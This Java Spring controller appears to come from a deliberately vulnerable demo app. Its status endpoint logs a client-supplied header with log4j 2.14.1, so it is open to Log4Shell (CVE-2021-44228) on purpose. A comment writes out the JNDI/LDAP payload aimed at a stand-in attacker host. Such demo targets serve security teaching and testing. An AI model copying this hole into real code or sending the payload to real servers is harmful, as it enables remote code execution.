package com.workforce.vms.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;

/** Health/status endpoint that logs a client-supplied header (Log4Shell). */
@RestController
public class StatusController {

    // Uses log4j2 (pinned 2.14.1) — the vulnerable Log4Shell version.
    private static final Logger log = LogManager.getLogger(StatusController.class);

    /**
     * LOG4SHELL (log4j-core 2.14.1, CVE-2021-44228).
     * GET /api/status   with header  X-Api-Version: ${jndi:ldap://attacker/x}
     * The user-controlled header is passed to the logger; message lookups are enabled
     * in 2.14.1, so "${jndi:ldap://...}" triggers a JNDI lookup -&gt; RCE.
     */
    @GetMapping("/api/status")
    public Map<String, Object> status(@RequestHeader(value = "X-Api-Version", defaultValue = "unknown") String apiVersion) {
        // DEMO-VULN: Log4Shell (CVE-2021-44228). Logging attacker-controlled input
        // with a vulnerable log4j2 version performs message lookups (JNDI).
        log.info("Health check requested by client api-version={}", apiVersion);
        return Map.of("service", "workforce-vms", "status", "UP", "apiVersion", apiVersion);
    }
}
